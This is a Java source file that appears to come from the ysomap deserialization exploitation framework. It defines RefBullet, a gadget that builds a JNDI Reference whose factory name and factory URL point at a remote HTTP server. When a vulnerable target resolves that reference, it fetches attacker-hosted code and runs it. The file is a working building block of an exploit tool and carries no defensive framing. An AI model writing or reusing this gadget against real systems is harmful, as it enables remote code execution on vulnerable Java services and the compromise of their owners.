package ysomap.gadget.bullet.jdk.rmi;

import ysomap.annotation.Authors;
import ysomap.annotation.Dependencies;
import ysomap.annotation.Require;
import ysomap.gadget.bullet.Bullet;

import javax.naming.Reference;

/**
 * @author wh1t3P1g
 * @since 2020/2/27
 */
@Dependencies({"*"})
@Authors({ Authors.WH1T3P1G })
public class RefBullet extends Bullet<Reference> {

    @Require(name = "factoryName", detail = "filename mounted by remote http server")
    private String factoryName;
    @Require(name = "factoryURL", detail = "remote http server URL")
    private String factoryURL;


    @Override
    public Reference getObject() throws Exception {
        if(factoryURL!=null && !factoryURL.endsWith("/")){
            factoryURL = factoryURL + "/";
        }
        return new Reference(factoryName, factoryName, factoryURL);
    }
}
